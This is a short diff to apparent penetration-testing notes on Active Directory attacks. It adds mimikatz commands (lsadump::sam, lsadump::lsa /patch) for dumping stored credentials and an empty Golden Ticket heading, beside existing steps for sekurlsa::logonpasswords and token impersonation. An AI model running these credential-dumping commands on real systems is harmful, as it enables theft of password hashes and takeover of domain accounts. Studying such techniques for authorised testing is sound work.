@@ -94,6 +94,11 @@ Transfer loot back to kali:
 2. `.\mimikatz.exe`
 3. `privilege::debug` (to gain access and bypass protection against memory) 
 4. `sekurlsa::logonpasswords` Not only are we compromising DC, when we comporised a regualr computer, it is going to show the PC and NTLM hash, and any other user that has logged into the computer ever since the last reboot which is stored in memory
+5. `lsadump::sam`
+6. `lsadump::lsa /patch`
+
+## Golden Ticket Attack
+1. 
 ## Token Impersonation
 0. If we navigate to a machine and token of a domain administrator(user), we have domain admin. 
 
